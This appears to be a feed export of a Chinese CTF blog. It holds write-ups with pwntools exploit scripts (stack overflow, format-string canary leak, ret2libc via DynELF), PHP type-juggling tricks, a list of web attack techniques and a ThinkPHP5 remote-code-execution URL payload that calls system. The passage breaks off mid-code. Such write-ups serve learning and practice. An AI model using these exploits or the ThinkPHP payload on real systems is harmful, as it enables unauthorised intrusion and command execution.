    <link href="/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/"/>
    <url>/2020/02/27/php-intval-%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%EF%BC%8Cis-numeric-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%BB%95%E8%BF%87%E5%9B%9E%E6%96%87%E5%88%A4%E6%96%AD/</url>
    
    <content type="html"><![CDATA[<p>Intval函数获取变量整数数值<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>这个有个应用就是在判断数值是不是回文上，如果参数为2147483647，那么当它反过来，由于超出了限制，所以依然等于2147483647。即为回文。</p><p>is_numeric()  判断变量是否为数字或数字字符串，不仅检查10进制，16进制是可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p><p>该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入</p><p>intval($req[“number”])=intval(strrev($req[“number”]))  如果要求不是回文，但又要满足这个条件，可以用科学计数法构造0=0：number=0e-0%00</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界pwn1</title>
    <link href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/"/>
    <url>/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/lxy8584099/p/11887235.html" target="_blank" rel="noopener">https://www.cnblogs.com/lxy8584099/p/11887235.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界stack2</title>
    <link href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/"/>
    <url>/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0" target="_blank" rel="noopener">https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CG-CTF Stack Overflow</title>
    <link href="/2020/02/10/CG-CTF-Stack-Overflow/"/>
    <url>/2020/02/10/CG-CTF-Stack-Overflow/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h1><p>先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh<br>下面是exp；</p><pre><code>from pwn import *re = remote(&#39;182.254.217.142&#39;,10001)fgets_plt = 0x080483D0data_addr = 0x0804A024re.sendline(&#39;1&#39;)payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;re.sendline(payload1)payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)re.sendline(payload2)re.interactive()</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界forgot</title>
    <link href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/"/>
    <url>/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/</url>
    
    <content type="html"><![CDATA[<h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><p>首先检查一下文件</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><p>可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地址，其计算是按照字节来计算而不是位，所以做的时候要注意计算的答案)。由于v14的初始值为1，并且里面正则判断的时候没有关于大写字符的判断，我们就可以直接写入大写字符覆盖v2，并将v3覆盖为我们需要的函数的地址，就可以拿到flag。<br>关注这个循环里面的内容，里面相当于正则表达式的判断，但是你仔细分析里switch中的函数时，可以发现没有判断大写字符的地方，我们可以注入大写字符，来达到不改变v14的值的效果。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界Mary_Morton</title>
    <link href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/"/>
    <url>/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/gaonuoqi/p/11760970.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaonuoqi/p/11760970.html</a></p><pre><code>Welcome to the battle ! [Great Fairy] level pwned Select your weapon 1. Stack Bufferoverflow Bug 2. Format String Bug 3. Exit the battle 2aaaa-%x-%x-%x-%x-%x-%x-%x-%xaaaa-451173d0-7f-d652c260-0-0-61616161-252d7825-2d78252d</code></pre><p>可以看见偏移量是6个字节。<br>又因为0x90-0x8=0x88,0x88/8+6=23.<br>故exp：</p><pre><code>from pwn import *r=remote(&#39;111.198.29.45&#39;,53501)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;2&#39;)r.sendline(&#39;%23$p&#39;)r.recvuntil(&#39;0x&#39;)canary=int(r.recv(16),16)print (canary)flag_addr=0x4008dapayload=&#39;a&#39;*0x88+p64(canary)+&#39;a&#39;*8+p64(flag_addr)r.recvuntil(&#39;3. Exit the battle&#39;)r.sendline(&#39;1&#39;)r.sendline(payload)r.interactive()</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>XCTF int_overflow</title>
    <link href="/2020/02/03/XCTF-int-overflow/"/>
    <url>/2020/02/03/XCTF-int-overflow/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/thread-1032448-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1032448-1-1.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jarvisoj pwn smashes</title>
    <link href="/2020/02/01/jarvisoj-pwn-smashes/"/>
    <url>/2020/02/01/jarvisoj-pwn-smashes/</url>
    
    <content type="html"><![CDATA[<h1 id="smashes"><a href="#smashes" class="headerlink" title="smashes"></a>smashes</h1><p><a href="https://blog.csdn.net/kevin66654/article/details/86773547" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773547</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>jarvisoj pwn level 4</title>
    <link href="/2020/01/30/jarvisoj-pwn-level-2/"/>
    <url>/2020/01/30/jarvisoj-pwn-level-2/</url>
    
    <content type="html"><![CDATA[<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>checksec 是x86的题目用IDA打开没有libc文件，通过查询知道了一个DynELF，可以泄露出libc从哪里开始的。<br>下面是EXP：</p><pre><code>from pwn import *re = remote(&quot;pwn2.jarvisoj.com&quot;,9880)elf = ELF(&#39;./level4&#39;)write_plt = elf.symbols[&#39;write&#39;]vul_addr=0x804844bbss_addr=0x0804a024def leak(address):        payload = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(write_plt) + p32(vul_addr) + p32(1) + p32(address) + p32(4)        re.sendline(payload)        data = re.recv(4)        return datawow = DynELF(leak,elf=elf)system_addr = wow.lookup(&#39;system&#39;,&#39;libc&#39;)read_plt = elf.symbols[&#39;read&#39;]payload2 = &#39;a&#39;*0x88 + &#39;a&#39;*4 + p32(read_plt) + p32(vul_addr) + p32(1) + p32(bss_addr) + p32(8)re.sendline(payload2)re.send(&#39;/bin/sh\x00&#39;)payload3 = &#39;a&#39;*0x88 +&#39;a&#39;*4 + p32(system_addr) +p32(0) + p32(bss_addr)re.sendline(payload3)re.interactive()</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF web考点</title>
    <link href="/2020/01/27/CTF-web%E8%80%83%E7%82%B9/"/>
    <url>/2020/01/27/CTF-web%E8%80%83%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB常见出题套路"><a href="#WEB常见出题套路" class="headerlink" title="WEB常见出题套路"></a>WEB常见出题套路</h1><p>1.爆破：包括爆破md5、爆破随机数、验证码识别等；<br>2.绕WAF：包括花式绕MySQL、绕文件读取关键字检测之类的拦截<br>3.花式玩弄几个PHP特性：包括弱类型，反序列化+destruct、\0截断、iconv截断；<br>4.密码题：包括hash长度扩展、异或、移位加密各种变形、32位随机数过小、随机数种子可预测等；<br>5.各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak；<br>6.文件上传：包括花式文件后缀.php345、inc、phtml、phpt、phps、各种文件内容检测&lt;?php &lt;? &lt;%；<script language=php>、花式解析漏洞；<br>7.MySQL类型差异：包括和PHP弱类型类似的特性，0x、0b、0e之类，varchar和integer相关转换，非strict模式截断等；<br>8.open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、Directorylterator及各种二进制选手插足的方法；<br>9.条件竞争：包括竞争删除前生成shell、竞争数据库无锁多扣钱；<br>10.社工：包括花式查社工库、微博、QQ签名、whois；<br>11.Windows特性：包括端文件名、iis解析漏洞、NTFS文件系统通配符、::$DATA、冒号截断；<br>12.SSRF：包括花式探测端口、302跳转、花式协议漏洞、gophar直接取shell等；<br>13.XSS：各种浏览器auditor绕过、富文本过滤黑名单绕过、flashxss、CSP绕过；<br>14.XXE：各种XML存在的地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）；<br>15.协议：花式IP伪造X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA、花式藏Flag、花式分析数据包；</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buuctf pwn(一)</title>
    <link href="/2020/01/23/buuctf-pwn-%E4%B8%80/"/>
    <url>/2020/01/23/buuctf-pwn-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>首先checksec test</p><pre><code>py@ubuntu:~/Desktop/123$ checksec test [*] &#39;/home/py/Desktop/123/test&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p><img src="/img/20.png" srcset="/img/loading.gif" alt=""><br>直接就出现了system(“/bin/sh”)</p><pre><code>py@ubuntu:~/Desktop/123$ nc node3.buuoj.cn 25832lsbinbootdevetcflaghomeliblib32lib64mediamntoptprocpwnrootrunsbinsrvsystmpusrvarcat flagflag{dbbbc714-136c-42fe-9eb0-cd653b4ae85a}</code></pre><blockquote><p>flag{dbbbc714-136c-42fe-9eb0-cd653b4ae85a}</p></blockquote><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>先检查一波</p><pre><code>py@ubuntu:~/Desktop/123$ checksec pwn1 [*] Checking for new versions of pwntools    To disable this functionality, set the contents of /home/py/.pwntools-cache/update to &#39;never&#39;.[*] A newer version of pwntools is available on pypi (3.13.0 --&gt; 4.0.1).    Update with: $ pip install -U pwntools[*] &#39;/home/py/Desktop/123/pwn1&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segmentspy@ubuntu:~/Desktop/123$ </code></pre><p>用IDA64打开</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [rsp+1h] [rbp-Fh]  puts(&quot;please input&quot;);  gets(&amp;s, argv);  puts(&amp;s);  puts(&quot;ok,bye!!!&quot;);  return 0;}</code></pre><p>很明显是一道栈溢出的题目。<br>发现system函数在func中func地址是:0x401186 system:0x401191<br>现在只要找到ebp的偏移量直接可以在IDA中看到偏移量为23。<br>payload=‘a’*23+p64(0x401198)+p64(0x401186)<br><img src="/img/21.png" srcset="/img/loading.gif" alt=""><br><img src="/img/22.png" srcset="/img/loading.gif" alt=""></p><p>我发现其实这个payload也是可以成功的：</p><blockquote><p>payload=’a’*23+p64(0x40118A)</p></blockquote><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>通过检查发现这是一个64位。<br>用ida打开</p><pre><code>__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [rsp+0h] [rbp-80h]  char v5; // [rsp+40h] [rbp-40h]  write(1, &quot;-Warm Up-\n&quot;, 0xAuLL);  write(1, &quot;WOW:&quot;, 4uLL);  sprintf(&amp;s, &quot;%p\n&quot;, sub_40060D);  write(1, &amp;s, 9uLL);  write(1, &quot;&gt;&quot;, 1uLL);  return gets(&amp;v5);}</code></pre><p>从gets函数可以看出这是一个栈溢出的题目并且sub_40060D可以返回flag。<br>直接构造payload。<br>同理IDA可以看到偏移量为0x40.</p><pre><code>from pwn import *re = remote(&quot;node3.buuoj.cn&quot;,29558)payload = &#39;a&#39;*0x40+&#39;a&#39;*8+p64(0x40060D)re.sendline(payload)re.interactive()</code></pre><blockquote><p>flag{fd152c6e-1b07-4a75-a9eb-7b95787cbba8}</p></blockquote><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>这段代码是在32的环境下的。<br>用ida.exe打开进行汇编。</p><pre><code>int vuln(){  const char *v0; // eax  char s; // [esp+1Ch] [ebp-3Ch]  char v3; // [esp+3Ch] [ebp-1Ch]  char v4; // [esp+40h] [ebp-18h]  char v5; // [esp+47h] [ebp-11h]  char v6; // [esp+48h] [ebp-10h]  char v7; // [esp+4Fh] [ebp-9h]  printf(&quot;Tell me something about yourself: &quot;);  fgets(&amp;s, 32, edata);  std::string::operator=((int)&amp;input, (int)&amp;s);  std::allocator&lt;char&gt;::allocator((int)&amp;v5);  std::string::string(&amp;v4, &quot;you&quot;, &amp;v5);  std::allocator&lt;char&gt;::allocator((int)&amp;v7);  std::string::string(&amp;v6, &quot;I&quot;, &amp;v7);  replace((std::string *)&amp;v3);  std::string::operator=(&amp;input, &amp;v3, &amp;v6, &amp;v4);  std::string::~string((std::string *)&amp;v3);  std::string::~string((std::string *)&amp;v6);  std::allocator&lt;char&gt;::~allocator(&amp;v7);  std::string::~string((std::string *)&amp;v4);  std::allocator&lt;char&gt;::~allocator(&amp;v5);  v0 = (const char *)std::string::c_str((std::string *)&amp;input);  strcpy(&amp;s, v0);  return printf(&quot;So, %s\n&quot;, &amp;s);}</code></pre><p> 发现输入的字符串在31位，但是s的偏移量是0x3c通过对函数的观察发现，I会变成you，那么久很容易构造了直接写exp。</p><pre><code>from pwn import *re = remote(&quot;node3.buuoj.cn&quot;,27612)payload = &#39;I&#39;*0x14 + &#39;a&#39;*4 +p32(0x08048F0D)re.sendline(payload)re.interactive(）</code></pre><p>直接得到falg：</p><blockquote><p>flag{033af733-ae45-42cd-882e-bb2e4a377c3b}</p></blockquote><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><p>这是一个64位的程序。</p><pre><code>int func(){  int result; // eax  char v1; // [rsp+0h] [rbp-30h]  float v2; // [rsp+2Ch] [rbp-4h]  v2 = 0.0;  puts(&quot;Let&#39;s guess the number.&quot;);  gets(&amp;v1);  if ( v2 == 11.28125 )    result = system(&quot;cat /flag&quot;);  else    result = puts(&quot;Its value should be 11.28125&quot;);  return result;}</code></pre><p>做出初步的预想，这是一个缓冲区溢出的题目，只需要利用gets函数覆盖v2。</p><pre><code>0000000000000030 var_30          db ?-000000000000002F                 db ? ; undefined-000000000000002E                 db ? ; undefined-000000000000002D                 db ? ; undefined-000000000000002C                 db ? ; undefined-000000000000002B                 db ? ; undefined-000000000000002A                 db ? ; undefined-0000000000000029                 db ? ; undefined-0000000000000028                 db ? ; undefined-0000000000000027                 db ? ; undefined-0000000000000026                 db ? ; undefined-0000000000000025                 db ? ; undefined-0000000000000024                 db ? ; undefined-0000000000000023                 db ? ; undefined-0000000000000022                 db ? ; undefined-0000000000000021                 db ? ; undefined-0000000000000020                 db ? ; undefined-000000000000001F                 db ? ; undefined-000000000000001E                 db ? ; undefined-000000000000001D                 db ? ; undefined-000000000000001C                 db ? ; undefined-000000000000001B                 db ? ; undefined-000000000000001A                 db ? ; undefined-0000000000000019                 db ? ; undefined-0000000000000018                 db ? ; undefined-0000000000000017                 db ? ; undefined-0000000000000016                 db ? ; undefined-0000000000000015                 db ? ; undefined-0000000000000014                 db ? ; undefined-0000000000000013                 db ? ; undefined-0000000000000012                 db ? ; undefined-0000000000000011                 db ? ; undefined-0000000000000010                 db ? ; undefined-000000000000000F                 db ? ; undefined-000000000000000E                 db ? ; undefined-000000000000000D                 db ? ; undefined-000000000000000C                 db ? ; undefined-000000000000000B                 db ? ; undefined-000000000000000A                 db ? ; undefined-0000000000000009                 db ? ; undefined-0000000000000008                 db ? ; undefined-0000000000000007                 db ? ; undefined-0000000000000006                 db ? ; undefined-0000000000000005                 db ? ; undefined-0000000000000004 var_4           dd ?+0000000000000000  s              db 8 dup(?)</code></pre><p>可以看见需要覆盖v2只要偏移0x30-0x04就行但是我失败了，我就想直接全部覆盖然后直接执行system的函数。<br>于是构造了payload：</p><blockquote><p>‘a’<em>0x30+’a’</em>8+p64(0x4006BE)</p></blockquote><p>得到了flag</p><pre><code>py@ubuntu:~/Desktop/python$ python cicn.py [+] Opening connection to node3.buuoj.cn on port 29278: Done[*] Switching to interactive modeLet&#39;s guess the number.Its value should be 11.28125flag{4972279e-05cd-42be-b52b-f963dbe9874a}timeout: the monitored command dumped core[*] Got EOF while reading in interactive</code></pre><p>flag:</p><blockquote><p>flag{4972279e-05cd-42be-b52b-f963dbe9874a}</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>buuctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界CGfsb</title>
    <link href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/"/>
    <url>/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCGfsb/</url>
    
    <content type="html"><![CDATA[<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>将文件checksec一下</p><pre><code>  py@ubuntu:~/Desktop/123$ checksec CGfsb  [*] &#39;/home/py/Desktop/123/CGfsb&#39;      Arch:     i386-32-little      RELRO:    Partial RELRO      Stack:    Canary found      NX:       NX enabled      PIE:      No PIE (0x8048000)</code></pre><p>用IDA观察一下</p><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  int buf; // [esp+1Eh] [ebp-7Eh]  int v5; // [esp+22h] [ebp-7Ah]  __int16 v6; // [esp+26h] [ebp-76h]  char s; // [esp+28h] [ebp-74h]  unsigned int v8; // [esp+8Ch] [ebp-10h]  v8 = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  setbuf(stderr, 0);  buf = 0;  v5 = 0;  v6 = 0;  memset(&amp;s, 0, 0x64u);  puts(&quot;please tell me your name:&quot;);  read(0, &amp;buf, 0xAu);  puts(&quot;leave your message please:&quot;);  fgets(&amp;s, 100, stdin);  printf(&quot;hello %s&quot;, &amp;buf);  puts(&quot;your message is:&quot;);  printf(&amp;s);  if ( pwnme == 8 )  {    puts(&quot;you pwned me, here is your flag:\n&quot;);    system(&quot;cat flag&quot;);  }  else  {    puts(&quot;Thank you!&quot;);  }  return 0;}</code></pre><p>看到printf（&amp;s）知道这是一个格式化漏洞。<br>双击pwnme知道他的地址是0x0804A068<br>在观察一下printf的偏移量<br>这里通过输入的‘21’带出了偏移地址</p><p><img src="/img/19.png" srcset="/img/loading.gif" alt=""><br><img src="/img/18.png" srcset="/img/loading.gif" alt=""><br>程序会将 %10$n 之前字符的个数写入到指定内存中，因此前面我们构造八个字符即可。</p><p>这里除了 p32(0x0804A068) + aaaa%10$n 这种形式我们也可以使用 p32(0x0804A068) + ‘%4c%10$n 能同样的达到效果</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界pwn get_shell</title>
    <link href="/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-get-shell/"/>
    <url>/2020/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-get-shell/</url>
    
    <content type="html"><![CDATA[<h1 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h1><pre><code>py@ubuntu:~$ cd Desktop/123py@ubuntu:~/Desktop/123$ checksec web_shell [*] &#39;/home/py/Desktop/123/web_shell&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)py@ubuntu:~/Desktop/123$ </code></pre><p>发现是64位有nx保护。先放到IDA pro进行反编译。</p><pre><code>  int __cdecl main(int argc, const char **argv, const char **envp)  {    puts(&quot;OK,this time we will get a shell.&quot;);    system(&quot;/bin/sh&quot;);    return 0;  }</code></pre><p>好吧，看来是个入门题。根本没有7颗星的难度。<br>直接nc 连接即可。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>黑客丛林之旅</title>
    <link href="/2020/01/19/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85/"/>
    <url>/2020/01/19/%E9%BB%91%E5%AE%A2%E4%B8%9B%E6%9E%97%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>F12看脚本直接第二关</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>修改脚本为return true</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src="/img/16.png" srcset="/img/loading.gif" alt=""><br>在源码中没有发现什么。用bp拦截看看。<br><img src="/img/17.png" srcset="/img/loading.gif" alt=""><br>将login=no改为login=yes</p><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>一点都不知道怎么做，看了看wp。<br>莫斯科电码。</p><blockquote><p>iamok</p></blockquote><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>直接base64解码没有技术含量。</p><blockquote><p>base64isok</p></blockquote><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>1、这关考察的是对默认端口的熟悉程度、<br>2、Mstsc是Windows的远程桌面程序、其默认端口是3389<br>3、Vnc是Linux的远程桌面程序、其默认端口是5900、<br>4、当Vnc连接一台服务器时、默认端口为5901、两台为5902、<br>5、Mssql为1433、Mysql：3306、Oracle：1521、所以password=6260</p><p>第七关：<a href="http://www.fj543.com/hack/?level=75901" target="_blank" rel="noopener">http://www.fj543.com/hack/?level=75901</a></p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>页面是个gif图片，将图片下载到本地，用txt打开，看到结尾处有提示<br>六幅图按照顺序是</p><p>8bIGNOREwmUPPERCASEqneWORDS</p><p>其中大写字母构成：</p><p>IGNORE UPPERCASE WORDS</p><p>也就是要忽略大写单词，剩下的 8bwmqne 即是过关答案</p><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关是社会工程学<br>吴世昌的网名是名字转数字fj543、他弟弟的网名应该就是fj573</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>(Use IE 5.43 version to browse ?level=9token)</p><p>ÄúµÄÁîÅÆ(Token):level964617<br/><br>¸ÃÁîÅÆÖ»ÔÚµ±ÌìÓÐÐ§¡£(The token is available only today)</p><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p>暴力破解</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界高手进阶区PHP_rec</title>
    <link href="/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/"/>
    <url>/2020/01/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAPHP-rec/</url>
    
    <content type="html"><![CDATA[<h1 id="php-rec"><a href="#php-rec" class="headerlink" title="php_rec"></a>php_rec</h1><p>进去以后F12看源码，什么都没发现。用御剑扫描一波没发现什么。就直接搜索thinkphp5 rce漏洞,改一改payload就出了。</p><blockquote><p>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下安装UPX</title>
    <link href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/"/>
    <url>/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/</url>
    
    <content type="html"><![CDATA[<p>upx 是一款压缩可执行文件的软件，压缩率在 20% 到 %70 之间。在可执行文件运行的时候并不需要解压软件，程序在内存中自动展开。</p><p>本教程在 linux 下进行，理论上支持所有 linux 发型版。</p><p>安装 upx<br>upx 请从 upx 官网下载，不要用包管理器进下载。一般来说发行版默认源的软件比较老可能不支持比较新的语言生成的二进制文件，有压坏二进制的风险。</p><p>本教程的下载地址可能不是最新版请访问 <a href="https://upx.github.io" target="_blank" rel="noopener">https://upx.github.io</a> 下载最新版</p><p>下载 upx</p><blockquote><blockquote><blockquote><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz" target="_blank" rel="noopener">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p></blockquote></blockquote></blockquote><p>解压二进制</p><blockquote><blockquote><blockquote><p>tar -Jxf upx*.tar.xz</p></blockquote></blockquote></blockquote><p>为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量</p><blockquote><blockquote><blockquote><p>sudo cp upx*/upx /usr/bin</p></blockquote></blockquote></blockquote><p>然后就可以使用了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.kr解题（一）</title>
    <link href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p><pre><code>fd@pwnable:~$ cat fd.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){    if(argc&lt;2){        printf(&quot;pass argv[1] a number\n&quot;);        return 0;    }    int fd = atoi( argv[1] ) - 0x1234;    int len = 0;    len = read(fd, buf, 32);    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){        printf(&quot;good job :)\n&quot;);        system(&quot;/bin/cat flag&quot;);        exit(0);    }    printf(&quot;learn about Linux file IO\n&quot;);    return 0;}</code></pre><p>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>所以我们可以使fd == 0，然后从终端输入LETMEWIN后回车<br>要使fd == 0，<br>则：输入的参数 == 0x1234，即4660<br>flag:</p><blockquote><p>mommy! I think I know what a file descriptor is!!</p></blockquote><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><p>ssh <a href="mailto:col@pwnable.kr">col@pwnable.kr</a> -p2222 (pw:guest)</p><pre><code>col@pwnable:~$ cat col.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){    int* ip = (int*)p;    int i;    int res=0;    for(i=0; i&lt;5; i++){        res += ip[i];    }    return res;}int main(int argc, char* argv[]){    if(argc&lt;2){        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);        return 0;    }    if(strlen(argv[1]) != 20){        